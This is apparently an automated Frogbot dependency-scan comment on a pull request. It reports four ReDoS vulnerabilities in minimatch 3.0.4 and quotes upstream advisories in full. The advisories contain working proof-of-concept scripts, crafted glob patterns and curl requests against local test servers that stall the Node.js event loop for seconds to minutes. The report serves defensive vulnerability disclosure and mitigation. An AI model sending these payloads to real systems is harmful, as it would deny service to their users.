

[comment]: <> (FrogbotReviewComment)

<div align='center'>

[![🚨 Frogbot scanned this pull request and found the below:](https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/vulnerabilitiesBannerPR.png)](https://jfrog.com/help/r/jfrog-security-user-guide/shift-left-on-security/frogbot)

</div>



## 📗 Scan Summary
- Frogbot scanned for vulnerabilities and found 4 issues

| Scan Category                | Status                  | Security Issues                  |
| --------------------- | :-----------------------------------: | ----------------------------------- |
| **Software Composition Analysis** | ✅ Done | <details><summary><b>4 Issues Found</b></summary><img src="https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/smallHigh.svg" alt=""/> 4 High<br></details> |
| **Contextual Analysis** | ✅ Done | - |
| **Static Application Security Testing (SAST)** | ✅ Done | Not Found |
| **Secrets** | ✅ Done | - |
| **Infrastructure as Code (IaC)** | ✅ Done | Not Found |

### 📦 Vulnerable Dependencies

| Severity                | ID                  | Contextual Analysis                  | Dependency Path                  |
| :---------------------: | :-----------------------------------: | :-----------------------------------: | ----------------------------------- |
| ![high (not applicable)](https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/notApplicableHigh.png)<br>    High | CVE-2026-27904 | Not Applicable | <details><summary><b>1 Direct</b></summary>minimatch:3.0.4<br></details> |
| ![high (not applicable)](https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/notApplicableHigh.png)<br>    High | CVE-2026-27903 | Not Applicable | <details><summary><b>1 Direct</b></summary>minimatch:3.0.4<br></details> |
| ![high (not applicable)](https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/notApplicableHigh.png)<br>    High | CVE-2026-26996 | Not Applicable | <details><summary><b>1 Direct</b></summary>minimatch:3.0.4<br></details> |
| ![high (not applicable)](https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/notApplicableHigh.png)<br>    High | CVE-2022-3517 | Not Applicable | <details><summary><b>1 Direct</b></summary>minimatch:3.0.4<br></details> |

### 🔖 Details


<details><summary><b>[ CVE-2026-27904 ] minimatch 3.0.4</b></summary>

### Vulnerability Details
|                 |                   |
| --------------------- | :-----------------------------------: |
| **Contextual Analysis:** | Not Applicable |
| **CVSS V3:** | 7.5 |
| **Dependency Path:** | <details><summary><b>minimatch: 3.0.4 (Direct)</b></summary><br></details> |

### Summary

Nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.

---

### Details

The root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:

```typescript
: this.type === '*' && bodyDotAllowed ? `)?`
: `)${this.type}`
```

This produces the following regexps:

| Pattern              | Generated regex                          |
|----------------------|------------------------------------------|
| `*(a\|b)`            | `/^(?:a\|b)*$/`                          |
| `*(*(a\|b))`         | `/^(?:(?:a\|b)*)*$/`                     |
| `*(*(*(a\|b)))`      | `/^(?:(?:(?:a\|b)*)*)*$/`               |
| `*(*(*(*(a\|b))))` | `/^(?:(?:(?:(?:a\|b)*)*)*)*$/`          |

These are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.

The generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.

Measured times via `minimatch()`:

| Pattern              | Input              | Time       |
|----------------------|--------------------|------------|
| `*(*(a\|b))`         | `a` x30 + `z`      | ~68,000ms  |
| `*(*(*(a\|b)))`      | `a` x20 + `z`      | ~124,000ms |
| `*(*(*(*(a\|b))))` | `a` x25 + `z`      | ~116,000ms |
| `*(a\|a)`            | `a` x25 + `z`      | ~2,000ms   |

Depth inflection at fixed input `a` x16 + `z`:

| Depth | Pattern              | Time         |
|-------|----------------------|--------------|
| 1     | `*(a\|b)`            | 0ms          |
| 2     | `*(*(a\|b))`         | 4ms          |
| 3     | `*(*(*(a\|b)))`      | 270ms        |
| 4     | `*(*(*(*(a\|b))))` | 115,000ms    |

Going from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.

---

### PoC

Tested on minimatch@10.2.2, Node.js 20.

**Step 1 -- verify the generated regexps and timing (standalone script)**

Save as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:

```javascript
import { minimatch, Minimatch } from 'minimatch'

function timed(fn) {
  const s = process.hrtime.bigint()
  let result, error
  try { result = fn() } catch(e) { error = e }
  const ms = Number(process.hrtime.bigint() - s) / 1e6
  return { ms, result, error }
}

// Verify generated regexps
for (let depth = 1; depth <= 4; depth++) {
  let pat = 'a|b'
  for (let i = 0; i < depth; i++) pat = `*(${pat})`
  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()
  console.log(`depth=${depth} "${pat}" -> ${re}`)
}
// depth=1 "*(a|b)"          -> /^(?:a|b)*$/
// depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
// depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
// depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/

// Safe-length timing (exponential growth confirmation without multi-minute hang)
const cases = [
  ['*(*(*(a|b)))', 15],   // ~270ms
  ['*(*(*(a|b)))', 17],   // ~800ms
  ['*(*(*(a|b)))', 19],   // ~2400ms
  ['*(*(a|b))',    23],   // ~260ms
  ['*(a|b)',      101],   // <5ms (depth=1 control)
]
for (const [pat, n] of cases) {
  const t = timed(() => minimatch('a'.repeat(n) + 'z', pat))
  console.log(`"${pat}" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`)
}

// Confirm noext disables the vulnerability
const t_noext = timed(() => minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }))
console.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)

// +() is equally affected
const t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'))
console.log(`"+(+(+(a|b)))" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`)
```

Observed output:
```
depth=1 "*(a|b)"          -> /^(?:a|b)*$/
depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/
"*(*(*(a|b)))" n=15: 269ms result=false
"*(*(*(a|b)))" n=17: 268ms result=false
"*(*(*(a|b)))" n=19: 2408ms result=false
"*(*(a|b))"    n=23: 257ms result=false
"*(a|b)"       n=101: 0ms result=false
noext=true: 0ms (should be ~0ms)
"+(+(+(a|b)))" n=18: 6300ms result=false
```

**Step 2 -- HTTP server (event loop starvation proof)**

Save as `poc4-server.mjs`:

```javascript
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3001
http.createServer((req, res) => {
  const url     = new URL(req.url, `http://localhost:${PORT}`)
  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern="${pattern}" path="${path.slice(0,30)}"`)
  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
}).listen(PORT, () => console.log(`listening on ${PORT}`))
```

Terminal 1 -- start the server:
```
node poc4-server.mjs
```

Terminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:
```
curl "http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz" &
```

Terminal 3 -- send a benign request while the attack is in-flight:
```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz"
```

**Observed output -- Terminal 2 (attack):**
```
{"result":false,"ms":"64149"}
```

**Observed output -- Terminal 3 (benign, concurrent):**
```
{"result":false,"ms":"0"}

time_total: 63.022047s
```

**Terminal 1 (server log):**
```
[2026-02-20T09:41:17.624Z] pattern="*(*(*(a|b)))" path="aaaaaaaaaaaaaaaaaaaz"
[2026-02-20T09:42:21.775Z] done in 64149ms result=false
[2026-02-20T09:42:21.779Z] pattern="*(a|b)" path="aaaz"
[2026-02-20T09:42:21.779Z] done in 0ms result=false
```

The server reports `"ms":"0"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.

Note: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.

---

### Impact

Any context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.

Depth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.

`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).

**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.<br></details>

<details><summary><b>[ CVE-2026-27903 ] minimatch 3.0.4</b></summary>

### Vulnerability Details
|                 |                   |
| --------------------- | :-----------------------------------: |
| **Contextual Analysis:** | Not Applicable |
| **CVSS V3:** | 7.5 |
| **Dependency Path:** | <details><summary><b>minimatch: 3.0.4 (Direct)</b></summary><br></details> |

### Summary

`matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.

---

### Details

The vulnerable loop is in `matchOne()` at [`src/index.ts#L960`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960):

```typescript
while (fr < fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
```

When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).

There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input.

Measured timing with n=30 path segments:

| k (globstars) | Pattern size | Time     |
|---------------|--------------|----------|
| 7             | 36 bytes     | ~154ms   |
| 9             | 46 bytes     | ~1.2s    |
| 11            | 56 bytes     | ~5.4s    |
| 12            | 61 bytes     | ~9.7s    |
| 13            | 66 bytes     | ~15.9s   |

---

### PoC

Tested on minimatch@10.2.2, Node.js 20.

**Step 1 -- inline script**

```javascript
import { minimatch } from 'minimatch'

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'
const path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'

const start = Date.now()
minimatch(path, pattern)
console.log(Date.now() - start + 'ms') // ~1200ms
```

To scale the effect, increase k:

```javascript
// k=11 -> ~5.4s, k=13 -> ~15.9s
const k = 11
const pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b'
const path    = Array(30).fill('a').join('/')
minimatch(path, pattern)
```

No special options are required. This reproduces with the default `minimatch()` call.

**Step 2 -- HTTP server (event loop starvation proof)**

The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:

```javascript
// poc1-server.mjs
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3000

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`)
  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }

  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
})

server.listen(PORT)
```

Terminal 1 -- start the server:
```
node poc1-server.mjs
```

Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:
```
curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &
```

Terminal 3 -- while the attack is in-flight, send a benign request:
```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz"
```

**Observed output (Terminal 3):**
```
{"result":true,"ms":"0"}

time_total: 4.132709s
```

The server reports `"ms":"0"` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:

```
{"result":true,"ms":"0"}

time_total: 0.001599s
```

---

### Impact

Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.<br></details>

<details><summary><b>[ CVE-2026-26996 ] minimatch 3.0.4</b></summary>

### Vulnerability Details
|                 |                   |
| --------------------- | :-----------------------------------: |
| **Contextual Analysis:** | Not Applicable |
| **CVSS V3:** | 7.5 |
| **Dependency Path:** | <details><summary><b>minimatch: 3.0.4 (Direct)</b></summary><br></details> |

### Summary
`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.

The time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.


### Details
_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._

### PoC
When minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:

```
/^(?!\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/
```

When the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.
### Impact
Any application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:
- File search/filter UIs that accept glob patterns
- `.gitignore`-style filtering with user-defined rules
- Build tools that accept glob configuration
- Any API that exposes glob matching to untrusted input

----

Thanks to @ljharb for back-porting the fix to legacy versions of minimatch.<br></details>

<details><summary><b>[ CVE-2022-3517 ] minimatch 3.0.4</b></summary>

### Vulnerability Details
|                 |                   |
| --------------------- | :-----------------------------------: |
| **Contextual Analysis:** | Not Applicable |
| **CVSS V3:** | 7.5 |
| **Dependency Path:** | <details><summary><b>minimatch: 3.0.4 (Direct)</b></summary><br></details> |

A vulnerability was found in the minimatch package. This flaw allows a Regular Expression Denial of Service (ReDoS) when calling the braceExpand function with specific arguments, resulting in a Denial of Service.<br></details>

---
<div align='center'>

[🐸 JFrog Frogbot](https://jfrog.com/help/r/jfrog-security-user-guide/shift-left-on-security/frogbot)

</div>
